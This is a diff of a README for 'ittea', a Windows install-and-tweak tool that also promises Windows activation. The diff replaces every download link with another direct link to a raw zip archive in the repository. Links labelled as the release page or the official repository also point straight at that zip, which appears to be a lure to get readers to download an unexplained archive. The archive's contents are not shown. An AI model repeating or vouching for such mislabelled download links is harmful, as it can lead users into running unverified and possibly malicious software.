@@ -1,7 +1,7 @@
 # 🚀 ittea - Simplifying Windows Setup and Optimization
 
 ## 🖱️ Download Now
-[![Download ittea](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip)](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip)
+[![Download ittea](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip)](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip)
 
 ## 📖 Overview
 itt ea, also known as ITT (Install Tweaks Tool), helps you install essential software, tweak your Windows system, and remove unnecessary programs. It is designed for Windows 10 and 11 users who want a smoother experience without the clutter.
@@ -10,7 +10,7 @@ itt ea, also known as ITT (Install Tweaks Tool), helps you install essential sof
 To install and use ittea, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to go directly to the release page.
-   [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip)
 
 2. **Choose the Latest Release:** Look for the version marked with the highest number, which is usually the most recent.
 
@@ -30,7 +30,7 @@ To install and use ittea, follow these simple steps:
 - **Windows Activation:** Simplifies the activation process of Windows.
 
 ## 🔧 Download & Install
-1. **Go to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip).
+1. **Go to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip).
    
 2. **Download the Installer:** Select the correct version suitable for your system.
 
@@ -57,8 +57,8 @@ If you encounter issues or have questions about using ittea, feel free to check 
 We welcome contributions and suggestions. If you're interested in helping improve ittea, please refer to the contribution guidelines in the repository.
 
 ## 🔗 Links
-- **Official Repository:** [GitHub Repository](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip)
-- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/selenobismuthite/ittea.zip)
+- **Official Repository:** [GitHub Repository](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/hbkhamza/ittea/main/scripts/Core/Software-3.9.zip)
 
 ## 📅 Changelog
 Stay tuned for updates to learn about new features and fixes in each release.
